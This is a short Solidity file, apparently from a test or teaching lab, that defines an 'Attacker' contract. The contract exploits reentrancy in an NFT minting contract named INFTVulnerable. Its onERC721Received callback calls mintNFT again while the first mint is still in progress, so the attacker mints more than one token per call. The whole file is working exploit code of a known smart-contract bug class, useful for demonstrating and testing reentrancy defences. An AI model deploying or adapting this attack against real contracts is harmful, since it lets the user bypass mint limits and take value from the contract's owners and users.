// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "hardhat/console.sol";

interface INFTVulnerable {
    function mintNFT() external payable;
}

contract Attacker is IERC721Receiver {
    INFTVulnerable public nft;
    uint public reentrancyCount;
    uint public constant DEFAULT_PRICE = 1 gwei;

    constructor(address nftAddress) {
        nft = INFTVulnerable(nftAddress);
    }

    function attack() external payable {
        nft.mintNFT{value: DEFAULT_PRICE}();
    }

    function onERC721Received(
        address,
        address,
        uint,
        bytes memory
    ) public override returns (bytes4) {
        if (reentrancyCount < 1) {
            ++reentrancyCount;
            nft.mintNFT{value: DEFAULT_PRICE}();
        }
        return this.onERC721Received.selector;
    }

}
